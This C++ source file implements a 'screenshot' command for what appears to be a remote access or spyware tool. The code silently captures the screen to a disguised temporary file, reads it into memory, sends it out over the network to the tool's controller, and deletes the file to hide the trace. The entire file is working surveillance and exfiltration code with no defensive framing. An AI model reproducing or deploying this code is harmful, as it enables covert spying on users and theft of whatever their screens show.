#include "stdafx.h"
#include "Command_screenshot.h"

#include "Settings.h"
#include "Logger.h"
#include "Network.h"
#include "ImageUtils.h"

Command_screenshot::Command_screenshot()
{
}

Command_screenshot::~Command_screenshot()
{
}

bool Command_screenshot::OnExecute(const std::vector<std::tstring> &args)
{
	bool ret = false;

	bool imageRet = imageUtils.TakeScreenshot(V_FAKE_TMP1);
	if (!imageRet)
	{
		VLog(LERROR, "Failed to take screenshot");
		return false;
	}

	HANDLE hFile = CreateFile(V_FAKE_TMP1, GENERIC_READ, NULL, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		VLog(LERROR, "Failed to open screenshot file");
		goto out_delete_file;
	}

	LARGE_INTEGER lsize;
	if (!GetFileSizeEx(hFile, &lsize))
	{
		VLog(LERROR, "Failed to get screenshot file size");
		goto out_close_file;
	}

	DWORD size = lsize.LowPart;

	char *buffer = (char*)malloc(size);
	if (!buffer)
	{
		VLog(LERROR, "Failed to allocate screenshot memory");
		goto out_close_file;
	}

	DWORD bytesRead;
	BOOL readRet = ReadFile(hFile, buffer, size, &bytesRead, NULL);
	if (!readRet)
	{
		VLog(LERROR, "Failed to read screenshot file");
		goto out_free_buffer;
	}

	if (bytesRead != size)
	{
		VLog(LERROR, "Failed to read screenshot file; bytesRead != size");
		goto out_free_buffer;
	}

	bool networkRet = network.SendFile(V_NET_FILE_DATA, size, buffer);
	if (!networkRet)
	{
		VLog(LERROR, "Failed to send screenshot file; network error");
		goto out_free_buffer;
	}

	ret = true;

out_free_buffer: free(buffer);
out_close_file:  CloseHandle(hFile);
out_delete_file: DeleteFile(V_FAKE_TMP1);
	return ret;
}